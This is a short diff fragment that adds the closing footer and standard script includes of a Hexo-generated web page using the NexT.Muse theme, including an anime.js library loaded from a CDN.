+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
